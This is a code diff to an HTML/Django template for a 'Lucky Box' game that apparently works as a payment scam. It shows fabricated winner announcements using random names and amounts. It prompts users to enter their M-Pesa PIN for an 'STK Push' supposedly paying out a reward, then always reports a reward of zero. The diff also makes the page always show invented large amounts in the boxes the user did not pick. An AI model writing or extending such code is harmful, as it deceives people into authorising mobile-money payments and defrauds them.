@@ -10,8 +10,6 @@
 <h2 class="text-center mb-4">Choose Your Lucky Box!</h2>
 <p class="text-center winnings-message">Winnings are directly deposited to your account</p>
 
-
-
 <!-- Lucky Box Game Form -->
 <form method="post" id="luckyBoxForm" class="game-form">
     {% csrf_token %}
@@ -31,7 +29,7 @@
 <div id="otherBoxChoices" class="hidden other-boxes"></div>
 
 <script>
-    function getRandomUser() {
+    function getRandomUser () {
         const users = ['Alice', 'Bob', 'Charlie', 'David', 'Eve', 'Frank', 'Grace', 'Hannah', 'Isaac', 'Jack', 'Kelly', 'Leo', 'Mia', 'Nina', 'Oscar', 'Paul', 'Quinn', 'Rachel', 'Steve', 'Tina', 'Ursula', 'Victor', 'Will', 'Xander', 'Yara', 'Zane'];
         return users[Math.floor(Math.random() * users.length)];
     }
@@ -41,7 +39,7 @@
     }
 
     function updateCongratsMessage() {
-        const user = getRandomUser();
+        const user = getRandomUser ();
         const amount = getRandomAmount();
         document.getElementById('messageContent').textContent = `Congrats ${user} for winning Sh.${amount}!`;
     }
@@ -66,34 +64,29 @@
             if (data.error) {
                 resultElement.classList.add('error');
                 resultElement.textContent = data.error;
-                otherBoxChoicesElement.classList.add('hidden');
             } else {
                 resultElement.classList.add('success');
                 resultElement.textContent = "STK Push initiated. Enter M-Pesa PIN to receive reward";
-                
-                setTimeout(() => {
-                    resultElement.style.opacity = '0';
-                }, 25000);
 
                 setTimeout(() => {
-                    resultElement.style.opacity = '1';
-                    resultElement.textContent = "Your reward is 0";
-                }, 40000);
+                    resultElement.textContent = `Your reward is sh. 0`;
+                }, 14000);
 
-                if (data.other_boxes && data.other_boxes.length > 0) {
-                    setTimeout(() => {
-                        otherBoxChoicesElement.classList.remove('hidden');
-                        otherBoxChoicesElement.innerHTML = '<h3>Other Box Choices:</h3>';
-                        data.other_boxes.forEach(box => {
-                            otherBoxChoicesElement.innerHTML += `<div>Box ${box.id}: Huge Amount of $${box.amount}</div>`;
-                        });
-                    }, 50000);
-                }
+                // Always show other boxes with random amounts
+                setTimeout(() => {
+                    otherBoxChoicesElement.classList.remove('hidden');
+                    otherBoxChoicesElement.innerHTML = '<h3>Other Box Choices:</h3>';
+                    
+                    for (let i = 1; i <= 3; i++) {
+                        if (i !== parseInt(formData.get('box_choice'))) {
+                            otherBoxChoicesElement.innerHTML += `<div>Box ${i}: Sh.${getRandomAmount()}</div>`;
+                        }
+                    }
+                }, 19000); 
             }
         })
         .catch(() => {
             document.getElementById('result').textContent = 'An error occurred while processing your request.';
-            document.getElementById('otherBoxChoices').classList.add('hidden');
         });
     });
 </script>
